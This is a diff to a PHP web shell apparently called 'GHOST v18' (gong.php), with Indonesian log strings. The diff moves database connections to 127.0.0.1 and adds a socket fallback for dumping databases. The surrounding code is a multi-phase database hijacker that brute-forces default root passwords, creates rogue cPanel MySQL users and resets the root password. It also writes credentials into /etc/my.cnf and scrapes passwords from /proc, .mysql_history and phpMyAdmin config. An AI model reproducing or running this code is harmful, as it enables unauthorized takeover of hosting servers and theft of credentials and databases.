@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V12: God Mode (Brutal Bypass).
+// GHOST v18 - V12.2: Pure PHP Vuln Scanner, Fix DB TCP.
 
-define('GH_VER',      '18.0.0-v12');
+define('GH_VER',      '18.0.0-v12.2');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,7 +338,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: GOD MODE DB HIJACKER (V12) =================================
+// ==== SECTION 4: GOD MODE DB HIJACKER (V12.1) ===============================
 function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
@@ -455,8 +455,8 @@ function gh_db_harvest() {
             $logs[] = "[*] Phase 4: Auto-Bruteforce default credentials...";
             $defaults = array(array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'), array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel'));
             foreach ($defaults as $creds) {
-                $conn = gh_db_connect('localhost', $creds[0], $creds[1]);
-                if ($conn) { $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'"; $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost'; $found_pass = true; break; }
+                $conn = gh_db_connect('127.0.0.1', $creds[0], $creds[1]);
+                if ($conn) { $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'"; $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = '127.0.0.1'; $found_pass = true; break; }
             }
         }
 
@@ -470,7 +470,7 @@ function gh_db_harvest() {
                 $create_res = gh_exec_adv("$uapi --user=$user Mysql create_user user=ghost_$rand_pass password=$rand_pass 2>&1");
                 if (strpos($create_res['out'], 'success') !== false) {
                     $logs[] = "[!] cPanel UAPI BERHASIL bikin user: ghost_$rand_pass (Pass: $rand_pass)";
-                    $conn = gh_db_connect('localhost', "ghost_$rand_pass", $rand_pass);
+                    $conn = gh_db_connect('127.0.0.1', "ghost_$rand_pass", $rand_pass);
                     if ($conn) { $found_pass = true; $db_user = "ghost_$rand_pass"; $db_pass = $rand_pass; }
                 } else { $logs[] = "[-] Gagal cPanel UAPI. Lanjut Phase 6..."; }
             } else { $logs[] = "[-] cPanel UAPI tidak ditemukan. Lanjut Phase 6..."; }
@@ -554,7 +554,7 @@ function gh_db_harvest() {
             $logs[] = "[*] Phase 11: MySQL Config Injection...";
             $backup = gh_read('/etc/my.cnf');
             gh_write('/etc/my.cnf', $backup . "\n[client]\nuser=root\npassword=root\n");
-            $conn = gh_db_connect('localhost', 'root', 'root');
+            $conn = gh_db_connect('127.0.0.1', 'root', 'root');
             if ($conn) { $logs[] = "[!] BERHASIL INJECT CONFIG!"; $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break; }
             gh_write('/etc/my.cnf', $backup); // Restore
         }
@@ -577,7 +577,7 @@ function gh_db_harvest() {
                 $res = gh_exec_adv("$uapi --user=$user Mysql set_password user=root password=root 2>&1");
                 if (strpos($res['out'], 'success') !== false) {
                     $logs[] = "[!] BERHASIL RESET PASSWORD ROOT VIA CPANEL!";
-                    $db_user = 'root'; $db_pass = 'root'; $db_host = 'localhost'; $found_pass = true; break;
+                    $db_user = 'root'; $db_pass = 'root'; $db_host = '127.0.0.1'; $found_pass = true; break;
                 }
             }
         }
@@ -591,7 +591,7 @@ function gh_db_harvest() {
                 if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
                 if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
                 if ($db_user && $db_pass) {
-                    $conn = gh_db_connect('localhost', $db_user, $db_pass);
+                    $conn = gh_db_connect('127.0.0.1', $db_user, $db_pass);
                     if ($conn) { $found_pass = true; break; }
                 }
             }
@@ -601,7 +601,7 @@ function gh_db_harvest() {
         if (!$found_pass) {
             $logs[] = "[*] Phase 15: Env Var Bypass...";
             if (gh_can_exec()) {
-                $res = gh_exec_adv("mysql -u root -e 'SHOW DATABASES' 2>&1");
+                $res = gh_exec_adv("mysql -h 127.0.0.1 -u root -e 'SHOW DATABASES' 2>&1");
                 if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
                     $logs[] = "[!] MYSQL CLI ROOT NO PASS BERHASIL!";
                     $found_pass = true; $db_user = 'root'; $db_pass = ''; break;
@@ -613,7 +613,7 @@ function gh_db_harvest() {
         if (!$found_pass) {
             $logs[] = "[*] Phase 16: MYSQL_PWD Env Injection...";
             @putenv('MYSQL_PWD=root');
-            $res = gh_exec_adv("mysql -u root -e 'SHOW DATABASES' 2>&1");
+            $res = gh_exec_adv("mysql -h 127.0.0.1 -u root -e 'SHOW DATABASES' 2>&1");
             if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
                 $logs[] = "[!] MYSQL_PWD ROOT BERHASIL!";
                 $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break;
@@ -628,7 +628,7 @@ function gh_db_harvest() {
             if (isset($proc_cmd['out']) && preg_match('/-p([^\s]+)/i', $proc_cmd['out'], $m)) {
                 $logs[] = "[+] Password ditemukan di /proc cmdline!";
                 $db_pass = trim($m[1]);
-                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                $conn = gh_db_connect('127.0.0.1', 'root', $db_pass);
                 if ($conn) { $found_pass = true; $db_user = 'root'; break; }
             }
         }
@@ -640,7 +640,7 @@ function gh_db_harvest() {
             if ($hist && preg_match('/IDENTIFIED BY \'([^\']+)\'/i', $hist, $m)) {
                 $logs[] = "[+] Password ditemukan di .mysql_history!";
                 $db_pass = trim($m[1]);
-                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                $conn = gh_db_connect('127.0.0.1', 'root', $db_pass);
                 if ($conn) { $found_pass = true; $db_user = 'root'; break; }
             }
         }
@@ -652,7 +652,7 @@ function gh_db_harvest() {
             if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
                 $logs[] = "[+] Password ditemukan di config phpMyAdmin!";
                 $db_pass = trim($m[1]);
-                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                $conn = gh_db_connect('127.0.0.1', 'root', $db_pass);
                 if ($conn) { $found_pass = true; $db_user = 'root'; break; }
             }
         }
@@ -685,7 +685,6 @@ function gh_db_harvest() {
         // Phase 27: LD_PRELOAD Web Server
         if (!$found_pass) {
             $logs[] = "[*] Phase 27: LD_PRELOAD Web Server...";
-            // (Placeholder)
         }
 
         // Phase 28: phpMyAdmin Config
@@ -695,7 +694,7 @@ function gh_db_harvest() {
             if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
                 $logs[] = "[+] Password ditemukan di phpMyAdmin!";
                 $db_pass = trim($m[1]);
-                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                $conn = gh_db_connect('127.0.0.1', 'root', $db_pass);
                 if ($conn) { $found_pass = true; $db_user = 'root'; break; }
             }
         }
@@ -727,9 +726,11 @@ function gh_db_harvest() {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
         $dbs = array();
-        $conn = gh_db_connect($db_host, $db_user, $db_pass, $db_socket);
-        if ($conn === 'CLI' || $db_user === 'wp-cli') {
-            $res = gh_exec_adv('mysql -h ' . @escapeshellarg($db_host) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
+        
+        // Coba dump via TCP dulu (127.0.0.1), kalau gagal baru pakai CLI
+        $conn = gh_db_connect('127.0.0.1', $db_user, $db_pass);
+        if ($conn === 'CLI') {
+            $res = gh_exec_adv('mysql -h 127.0.0.1 -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
             $lines = explode("\n", trim($res['out']));
             foreach ($lines as $i => $l) { if ($i > 0 && trim($l)) $dbs[] = trim($l); }
         } elseif ($conn instanceof mysqli) {
@@ -740,8 +741,24 @@ function gh_db_harvest() {
             $q = @$conn->query("SHOW DATABASES");
             if ($q) { while($r = $q->fetch(PDO::FETCH_NUM)) $dbs[] = $r[0]; }
         }
+        
+        // Kalau TCP gagal, coba pake socket
+        if (empty($dbs)) {
+            $logs[] = "[*] Dump via TCP gagal, mencoba via Socket...";
+            $conn = gh_db_connect('localhost', $db_user, $db_pass);
+            if ($conn instanceof mysqli) {
+                $q = @mysqli_query($conn, "SHOW DATABASES");
+                if ($q) { while($r = mysqli_fetch_array($q)) $dbs[] = $r[0]; }
+                @mysqli_close($conn);
+            }
+        }
+
         $info['databases'] = $dbs;
-        $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
+        if (!empty($dbs)) {
+            $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
+        } else {
+            $logs[] = "[-] Gagal dump database (koneksi terputus).";
+        }
     } else {
         $logs[] = "[-] SEMUA PHASE GAGAL SETELAH $max_iterations ITERASI. Server sangat ketat.";
     }
@@ -925,7 +942,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - V12) =============================================
+// ==== UI (TAB NAVIGATION - V12.2) ===========================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
